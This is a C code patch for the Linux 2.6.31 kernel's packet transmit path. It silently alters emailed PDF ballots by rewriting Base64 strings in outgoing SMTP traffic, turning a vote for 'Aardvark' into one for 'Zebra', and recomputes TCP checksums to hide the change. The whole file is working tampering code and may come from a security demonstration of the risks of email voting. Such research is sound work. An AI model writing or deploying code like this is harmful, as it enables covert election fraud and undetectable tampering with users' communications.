/*
 * This gets inserted into "dev_queue_xmit" in net/core/dev.c, line 1856 
 * in the version we patched from Linux 2.6.31. It runs right after the 
 * "skb->ip_summed == CHECKSUM_PARTIAL" check block, and right before 
 * "rcu_read_lock_bh()" is called.
 *
 * It searches all TCP packets destined for ports 25 and 587 (standard 
 * SMTP submission ports) for a given string (in this case, a Base64-
 * encoded vote for Aardvark) and replaces that string with another 
 * string (in this case, a Base64-encoded vote for Zebra) to modify a 
 * PDF ballot.
 *
 * Because this code acts only on single TCP packets, it cannot handle  
 * the case where the string to replace crosses a packet boundary. 
 */
 
// begin vote replacement code
if (skb && skb->protocol == htons(ETH_P_IP)) {
﻿ struct iphdr *iph = ip_hdr(skb);
  struct tcphdr *tcph;
  unsigned char *tcpbuf;
  // find is strings we want to find
  const int num_targets = 4;
  const unsigned char *find[] = 
    { "PCAvViAvTkZM", "UyAvTkZM", 
      "UCA4OCAwIFIgL0ggL1AgL1BhcmVudCAyNCAwIFIKL0FTIC9PZmYg",
      "IC9PZmYgL1R5cGUgL0Fubm90IC9GZiA0OTE1MiA+PgplbmRvYmoKODgg" };
  // replace is strings we want to replace them with
  const unsigned char *replace[] = 
    { "PCAvViAvTUxT", "UyAvT2Zm", 
      "UCA4OCAwIFIgL0ggL1AgL1BhcmVudCAyNCAwIFIKL0FTIC9NTFMg",
      "IC9NTFMgL1R5cGUgL0Fubm90IC9GZiA0OTE1MiA+PgplbmRvYmoKODgg" };
  int matched = 0;
  int tcplen = 0;
  
  if (iph && iph->protocol && iph->protocol == IPPROTO_TCP) {
    // figure out where this tcp packet is going, using tcplen
    // to temporarily store the destination port
    tcph = (struct tcphdr *) ((__u32 *)iph + iph->ihl);
    tcplen = ntohs(tcph->dest);

    if (((tcplen == 25) || (tcplen == 587)) && !skb_linearize(skb)) {
      int t = 0;
      
      // at this point the SKB is linearized, so all data is in the 
      // data segment; since we may have changed some of its internal 
      // structure in linearization, we do some recalculations
      iph = ip_hdr(skb);
      tcph = (struct tcphdr *) ((__u32 *)iph + iph->ihl);
      tcpbuf = (unsigned char *)tcph;
      tcplen = ntohs(iph->tot_len) - sizeof(struct iphdr);

      // search for the strings to replace; this is a naive search
      // algorithm and could be made more efficient in many ways
      for (t = 0; t < num_targets; t++) {
        char *location = NULL;
        const unsigned char *target = find[t];
        const int target_len = strlen(target);
        int offset = 0;
        
        while (!location && offset < tcplen) {
          int cnt = 0;
          while (cnt < target_len && (offset + cnt < tcplen)) {
            if (tcpbuf[offset + cnt] == target[cnt]) {
              cnt++;
            } else {
              break;
            }
          }
          if (cnt == target_len) {
            location = tcpbuf + offset;
          } 
          offset++;
        }

        if (location != NULL) {
          matched++;
          memcpy(location, replace[t], target_len);
        }
      }
      
      // recalculate TCP checksum if we found a match; IP checksum 
      // stays the same because we don't change packet size, source, 
      // or destination
      if (matched > 0) {
        tcph->check = 0;
        tcph->check = csum_tcpudp_magic(iph->saddr, iph->daddr, 
                                        tcplen, IPPROTO_TCP, 
                                        csum_partial(tcpbuf, tcplen, 0));
        // make sure later processing code doesn't think the hardware
        // helped with our checksum
        skb->ip_summed = CHECKSUM_NONE;
      }
    }
  }
}
// end vote replacement code